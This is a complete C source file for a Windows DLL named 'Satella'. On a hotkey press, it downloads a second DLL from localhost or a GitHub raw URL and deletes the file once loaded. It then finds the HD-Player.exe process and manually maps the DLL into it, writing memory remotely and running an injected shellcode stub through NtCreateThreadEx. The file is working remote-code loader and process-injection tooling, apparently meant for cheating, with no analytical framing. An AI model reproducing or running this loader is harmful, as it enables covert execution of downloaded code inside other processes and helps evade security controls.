#include <windows.h>
#include <winhttp.h>
#include <tlhelp32.h>
#pragma comment(lib, "winhttp.lib")

#define SHM_NAME    L"Global\\SatellaSharedMem"
#define SHM_EVENT   L"Global\\SatellaReady"
#define SHM_SIZE    (4 * 1024 * 1024)  // 4 MB

typedef struct {
    DWORD dllSize;
    DWORD status;
    BYTE  data[SHM_SIZE - 8];
} SHARED_MEM;

static HANDLE g_shm = NULL, g_evt = NULL;
static SHARED_MEM* g_mem = NULL;
static BYTE* g_dllData = NULL;
static DWORD g_dllSize = 0;

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

static DWORD RvaToOffset(PIMAGE_NT_HEADERS64 nt, DWORD rva) {
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (rva >= sec[i].VirtualAddress && rva < sec[i].VirtualAddress + sec[i].SizeOfRawData)
            return rva - sec[i].VirtualAddress + sec[i].PointerToRawData;
    }
    return rva;
}

static DWORD FindProcess(const wchar_t* name) {
    DWORD pid = 0;
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    if (Process32FirstW(snap, &pe)) do {
        if (lstrcmpiW(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; }
    } while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return pid;
}

static BOOL DownloadFrom(const wchar_t* host, INTERNET_PORT port, const wchar_t* path, const wchar_t* outPath) {
    HINTERNET sess = WinHttpOpen(L"SatellaLoader", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!sess) return FALSE;
    HINTERNET conn = WinHttpConnect(sess, host, port, 0);
    if (!conn) { WinHttpCloseHandle(sess); return FALSE; }
    HINTERNET req = WinHttpOpenRequest(conn, L"GET", path, NULL, NULL, NULL, 0);
    if (!req) { WinHttpCloseHandle(conn); WinHttpCloseHandle(sess); return FALSE; }
    if (!WinHttpSendRequest(req, NULL, 0, NULL, 0, 0, 0) || !WinHttpReceiveResponse(req, NULL)) {
        WinHttpCloseHandle(req); WinHttpCloseHandle(conn); WinHttpCloseHandle(sess); return FALSE;
    }
    DWORD st = 0, sz = sizeof(st);
    WinHttpQueryHeaders(req, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &st, &sz, NULL);
    if (st != 200) { WinHttpCloseHandle(req); WinHttpCloseHandle(conn); WinHttpCloseHandle(sess); return FALSE; }
    HANDLE f = CreateFileW(outPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE) { WinHttpCloseHandle(req); WinHttpCloseHandle(conn); WinHttpCloseHandle(sess); return FALSE; }
    BYTE buf[8192]; DWORD rd = 0;
    while (WinHttpReadData(req, buf, sizeof(buf), &rd) && rd > 0) {
        DWORD wr; WriteFile(f, buf, rd, &wr, NULL);
    }
    CloseHandle(f); WinHttpCloseHandle(req); WinHttpCloseHandle(conn); WinHttpCloseHandle(sess);
    return TRUE;
}

static BOOL DownloadDLL() {
    wchar_t dllPath[MAX_PATH];
    GetTempPathW(MAX_PATH, dllPath);
    lstrcatW(dllPath, L"Satella_XXXX.dll");
    wchar_t* p = wcsstr(dllPath, L"XXXX");
    if (p) wsprintfW(p, L"%04X", GetTickCount() & 0xFFFF);

    BOOL ok = DownloadFrom(L"127.0.0.1", 5000, L"/api/download", dllPath);
    if (!ok) ok = DownloadFrom(L"raw.githubusercontent.com", INTERNET_DEFAULT_HTTPS_PORT,
        L"/semataryiscrazy/xicara-de-cafe/refs/heads/main/Satella.dll?v=5", dllPath);

    if (ok) {
        HANDLE f = CreateFileW(dllPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (f != INVALID_HANDLE_VALUE) {
            g_dllSize = GetFileSize(f, NULL);
            if (g_dllSize > 0) {
                g_dllData = (BYTE*)VirtualAlloc(NULL, g_dllSize, MEM_COMMIT, PAGE_READWRITE);
                if (g_dllData) {
                    DWORD rd = 0;
                    if (!ReadFile(f, g_dllData, g_dllSize, &rd, NULL) || rd != g_dllSize) {
                        VirtualFree(g_dllData, 0, MEM_RELEASE); g_dllData = NULL;
                    }
                }
            }
            CloseHandle(f);
        }
        DeleteFileW(dllPath);
    }
    return (g_dllData != NULL);
}

static BOOL ReadDLLFromSharedMem() {
    if (g_mem && g_mem->status == 1 && g_mem->dllSize > 0) {
        g_dllSize = g_mem->dllSize;
        g_dllData = (BYTE*)VirtualAlloc(NULL, g_dllSize, MEM_COMMIT, PAGE_READWRITE);
        if (g_dllData) {
            CopyMemory(g_dllData, g_mem->data, g_dllSize);
            return TRUE;
        }
    }
    return FALSE;
}

static BOOL InjectManualMap(HANDLE hp, BYTE* dllFileData, DWORD dllFileSize) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)dllFileData;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    PIMAGE_NT_HEADERS64 nt = (PIMAGE_NT_HEADERS64)(dllFileData + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE || nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) return FALSE;

    DWORD imageSize = nt->OptionalHeader.SizeOfImage;
    DWORD entryRVA = nt->OptionalHeader.AddressOfEntryPoint;
    UINT_PTR imageBase = nt->OptionalHeader.ImageBase;
    DWORD importDirRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    DWORD importDirSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;
    DWORD relocDirRVA = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    DWORD relocDirSize = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

    LPVOID remoteBase = VirtualAllocEx(hp, NULL, imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteBase) return FALSE;

    if (!WriteProcessMemory(hp, remoteBase, dllFileData, nt->OptionalHeader.SizeOfHeaders, NULL)) {
        VirtualFreeEx(hp, remoteBase, 0, MEM_RELEASE); return FALSE;
    }

    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        LPVOID dest = (BYTE*)remoteBase + sec[i].VirtualAddress;
        LPVOID src = dllFileData + sec[i].PointerToRawData;
        DWORD size = min(sec[i].SizeOfRawData, sec[i].Misc.VirtualSize);
        if (size > 0) {
            if (!WriteProcessMemory(hp, dest, src, size, NULL)) {
                VirtualFreeEx(hp, remoteBase, 0, MEM_RELEASE); return FALSE;
            }
        }
    }

    if (importDirRVA && importDirSize) {
        DWORD impDescOff = RvaToOffset(nt, importDirRVA);
        PIMAGE_IMPORT_DESCRIPTOR impDesc = (PIMAGE_IMPORT_DESCRIPTOR)(dllFileData + impDescOff);
        for (; impDesc->Name; impDesc++) {
            DWORD nameOff = RvaToOffset(nt, impDesc->Name);
            char* dllName = (char*)(dllFileData + nameOff);
            HMODULE hMod = LoadLibraryA(dllName);
            if (!hMod) continue;
            DWORD oftOff = RvaToOffset(nt, impDesc->OriginalFirstThunk ? impDesc->OriginalFirstThunk : impDesc->FirstThunk);
            DWORD ftOff = RvaToOffset(nt, impDesc->FirstThunk);
            PIMAGE_THUNK_DATA64 origThunk = (PIMAGE_THUNK_DATA64)(dllFileData + oftOff);
            PIMAGE_THUNK_DATA64 firstThunk = (PIMAGE_THUNK_DATA64)(dllFileData + ftOff);
            for (; origThunk->u1.AddressOfData; origThunk++, firstThunk++) {
                UINT_PTR funcAddr = 0;
                if (IMAGE_SNAP_BY_ORDINAL64(origThunk->u1.Ordinal)) {
                    funcAddr = (UINT_PTR)GetProcAddress(hMod, (LPCSTR)IMAGE_ORDINAL64(origThunk->u1.Ordinal));
                } else {
                    DWORD nameDataOff = RvaToOffset(nt, (DWORD)origThunk->u1.AddressOfData);
                    PIMAGE_IMPORT_BY_NAME impName = (PIMAGE_IMPORT_BY_NAME)(dllFileData + nameDataOff);
                    funcAddr = (UINT_PTR)GetProcAddress(hMod, impName->Name);
                }
                if (funcAddr) {
                    DWORD iatRVA = impDesc->FirstThunk + (DWORD)((BYTE*)firstThunk - (BYTE*)(dllFileData + ftOff));
                    LPVOID remoteIatEntry = (BYTE*)remoteBase + iatRVA;
                    WriteProcessMemory(hp, remoteIatEntry, &funcAddr, sizeof(funcAddr), NULL);
                }
            }
        }
    }

    UINT_PTR delta = (UINT_PTR)remoteBase - imageBase;
    if (delta != 0 && relocDirSize > 0) {
        BYTE* relocData = (BYTE*)VirtualAlloc(NULL, relocDirSize, MEM_COMMIT, PAGE_READWRITE);
        if (relocData) {
            LPVOID relocRemote = (BYTE*)remoteBase + relocDirRVA;
            SIZE_T rd = 0;
            if (ReadProcessMemory(hp, relocRemote, relocData, relocDirSize, &rd) && rd == relocDirSize) {
                BYTE* cur = relocData;
                BYTE* end = cur + relocDirSize;
                while (cur + 8 <= end) {
                    DWORD pageRVA = *(DWORD*)cur;
                    DWORD blkSize = *(DWORD*)(cur + 4);
                    if (pageRVA == 0 || blkSize < 8) break;
                    if (cur + blkSize > end) break;
                    WORD* entries = (WORD*)(cur + 8);
                    DWORD count = (blkSize - 8) / 2;
                    for (DWORD j = 0; j < count; j++) {
                        WORD type = entries[j] >> 12;
                        WORD offset = entries[j] & 0xFFF;
                        if (type == IMAGE_REL_BASED_DIR64) {
                            UINT_PTR val = 0;
                            LPVOID patchAddr = (BYTE*)remoteBase + pageRVA + offset;
                            ReadProcessMemory(hp, patchAddr, &val, sizeof(val), NULL);
                            val += delta;
                            WriteProcessMemory(hp, patchAddr, &val, sizeof(val), NULL);
                        }
                    }
                    cur += blkSize;
                }
            }
            VirtualFree(relocData, 0, MEM_RELEASE);
        }
    }

    BYTE stub[64] = {0};
    SIZE_T sz = 0;
    stub[sz++] = 0x48; stub[sz++] = 0x83; stub[sz++] = 0xEC; stub[sz++] = 0x28;
    stub[sz++] = 0x48; stub[sz++] = 0xB9;
    *(UINT_PTR*)(stub + sz) = (UINT_PTR)remoteBase; sz += 8;
    stub[sz++] = 0xBA; stub[sz++] = 0x01; stub[sz++] = 0x00; stub[sz++] = 0x00; stub[sz++] = 0x00;
    stub[sz++] = 0x4D; stub[sz++] = 0x31; stub[sz++] = 0xC0;
    stub[sz++] = 0x48; stub[sz++] = 0xB8;
    *(UINT_PTR*)(stub + sz) = (UINT_PTR)remoteBase + entryRVA; sz += 8;
    stub[sz++] = 0xFF; stub[sz++] = 0xD0;
    stub[sz++] = 0x48; stub[sz++] = 0x83; stub[sz++] = 0xC4; stub[sz++] = 0x28;
    stub[sz++] = 0xC3;

    LPVOID remoteStub = VirtualAllocEx(hp, NULL, sz, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!remoteStub || !WriteProcessMemory(hp, remoteStub, stub, sz, NULL)) {
        if (remoteStub) VirtualFreeEx(hp, remoteStub, 0, MEM_RELEASE);
        VirtualFreeEx(hp, remoteBase, 0, MEM_RELEASE); return FALSE;
    }

    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");
    if (!NtCreateThreadEx) {
        VirtualFreeEx(hp, remoteStub, 0, MEM_RELEASE);
        VirtualFreeEx(hp, remoteBase, 0, MEM_RELEASE); return FALSE;
    }

    HANDLE thr = NULL;
    NTSTATUS status = NtCreateThreadEx(&thr, THREAD_ALL_ACCESS, NULL, hp,
        remoteStub, NULL, 0, 0, 0, 0, NULL);
    if (status < 0 || !thr) {
        VirtualFreeEx(hp, remoteStub, 0, MEM_RELEASE);
        VirtualFreeEx(hp, remoteBase, 0, MEM_RELEASE); return FALSE;
    }

    DWORD waitRes = WaitForSingleObject(thr, 15000);
    DWORD exitCode = 0;
    if (waitRes == WAIT_TIMEOUT) { TerminateThread(thr, 0); }
    else { GetExitCodeThread(thr, &exitCode); }

    VirtualFreeEx(hp, remoteStub, 0, MEM_RELEASE);
    CloseHandle(thr);
    CloseHandle(hp);
    return (exitCode == TRUE);
}

static DWORD WINAPI LoaderThread(LPVOID) {
    g_shm = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, SHM_SIZE, SHM_NAME);
    if (!g_shm && GetLastError() == ERROR_ALREADY_EXISTS)
        g_shm = OpenFileMappingW(FILE_MAP_ALL_ACCESS, FALSE, SHM_NAME);
    if (g_shm) g_mem = (SHARED_MEM*)MapViewOfFile(g_shm, FILE_MAP_ALL_ACCESS, 0, 0, SHM_SIZE);

    g_evt = CreateEventW(NULL, TRUE, FALSE, SHM_EVENT);
    if (!g_evt && GetLastError() == ERROR_ALREADY_EXISTS)
        g_evt = OpenEventW(EVENT_ALL_ACCESS, FALSE, SHM_EVENT);

    if (!RegisterHotKey(NULL, 1, MOD_NOREPEAT, VK_HOME)) {
        if (g_mem) g_mem->status = 4;
        return 1;
    }

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        if (msg.message == WM_HOTKEY && msg.wParam == 1) {
            if (g_mem) g_mem->status = 2;

            // Free previous DLL data
            if (g_dllData) { VirtualFree(g_dllData, 0, MEM_RELEASE); g_dllData = NULL; g_dllSize = 0; }

            // Try shared memory first (if launcher pre-loaded)
            if (g_evt && WaitForSingleObject(g_evt, 0) == WAIT_OBJECT_0) {
                ReadDLLFromSharedMem();
            }

            // Fallback: download directly
            if (!g_dllData) {
                DownloadDLL();
            }

            if (!g_dllData) {
                if (g_mem) g_mem->status = 4;
                continue;
            }

            DWORD pid = FindProcess(L"HD-Player.exe");
            if (pid == 0) {
                if (g_mem) g_mem->status = 4;
                VirtualFree(g_dllData, 0, MEM_RELEASE); g_dllData = NULL;
                continue;
            }

            HANDLE hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
            if (!hp) {
                if (g_mem) g_mem->status = 4;
                VirtualFree(g_dllData, 0, MEM_RELEASE); g_dllData = NULL;
                continue;
            }

            BOOL ok = InjectManualMap(hp, g_dllData, g_dllSize);
            CloseHandle(hp);

            if (g_mem) g_mem->status = ok ? 3 : 4;

            VirtualFree(g_dllData, 0, MEM_RELEASE); g_dllData = NULL;

            if (ok) {
                if (g_mem) g_mem->status = 3;
            }
        }
    }
    return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hinstDLL);
        HANDLE hThread = CreateThread(NULL, 0, LoaderThread, NULL, 0, NULL);
        if (hThread) CloseHandle(hThread);
    }
    if (fdwReason == DLL_PROCESS_DETACH) {
        if (g_dllData) VirtualFree(g_dllData, 0, MEM_RELEASE);
        if (g_mem) UnmapViewOfFile(g_mem);
        if (g_shm) CloseHandle(g_shm);
        if (g_evt) CloseHandle(g_evt);
    }
    return TRUE;
}
